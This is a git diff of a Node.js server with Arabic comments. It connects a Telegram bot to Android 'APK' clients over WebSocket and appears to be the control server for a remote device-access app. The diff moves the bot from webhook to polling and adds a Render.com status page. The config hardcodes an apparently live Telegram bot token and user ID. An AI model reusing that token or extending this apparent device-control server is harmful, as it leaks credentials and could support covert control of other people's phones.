@@ -9,7 +9,7 @@ const http = require('http');
 const config = {
     TELEGRAM_TOKEN: "8330048649:AAFYzP0EvuJTYm__yo4AROYvIt3fy-HDGXY", // ضع توكن البوت هنا
     AUTHORIZED_USERS: [7604667042], // ضع أيدي التلجرام الخاص بك هنا
-    SERVER_PORT: process.env.PORT || 10000,
+    SERVER_PORT: process.env.PORT || 3000, // Render.com يحدد المنفذ تلقائياً
     SERVER_HOST: "0.0.0.0"
 };
 
@@ -28,25 +28,29 @@ const app = express();
 const server = http.createServer(app);
 const wss = new WebSocket.Server({ server });
 
-// 🔧 إصلاح: استخدام webhook بدلاً من polling
+// 🔧 إصلاح: استخدام polling عادي مع إعدادات آمنة
 const bot = new TelegramBot(config.TELEGRAM_TOKEN, {
-    webHook: {
-        port: config.SERVER_PORT
+    polling: {
+        interval: 300,
+        autoStart: true,
+        params: {
+            timeout: 10
+        }
     }
 });
-
-// 🔧 إعداد webhook
-bot.setWebHook(`https://${process.env.RENDER_EXTERNAL_HOSTNAME}/bot${config.TELEGRAM_TOKEN}`);
 
 const connectedDevices = new Map();
 const userSessions = new Map();
 
 app.use(express.json());
 
-// 🔧 مسار webhook
-app.post(`/bot${config.TELEGRAM_TOKEN}`, (req, res) => {
-    bot.processUpdate(req.body);
-    res.sendStatus(200);
+// 🔧 صفحة رئيسية للتأكد من عمل السيرفر
+app.get('/', (req, res) => {
+    res.json({
+        status: '✅ السيرفر يعمل',
+        devices: connectedDevices.size,
+        uptime: process.uptime()
+    });
 });
 
 // 🔌 اتصال WebSocket من APK
@@ -68,7 +72,8 @@ wss.on('connection', (ws, req) => {
         type: 'welcome',
         deviceId: deviceId,
         message: 'تم الاتصال بنجاح بالسيرفر',
-        timestamp: Date.now()
+        timestamp: Date.now(),
+        server: 'Render.com'
     }));
 
     // 📨 إرسال إشعار للتلجرام
@@ -542,10 +547,10 @@ function formatTimeDiff(date) {
 
 // 🚀 بدء السيرفر
 server.listen(config.SERVER_PORT, config.SERVER_HOST, () => {
-    console.log(`✅ البوت تم إنشاؤه بنجاح`);
-    console.log(`🎯 سيرفر WebSocket يعمل على: http://${config.SERVER_HOST}:${config.SERVER_PORT}`);
+    console.log(`✅ السيرفر يعمل على المنفذ: ${config.SERVER_PORT}`);
+    console.log(`🤖 بوت التلجرام جاهز`);
     console.log(`📱 جاهز لاستقبال اتصالات APK`);
-    console.log(`🤖 البوت نشط`);
+    console.log(`🌐 الرابط: https://bot-d4k2.onrender.com`);
 });
 
 process.on('uncaughtException', (error) => {
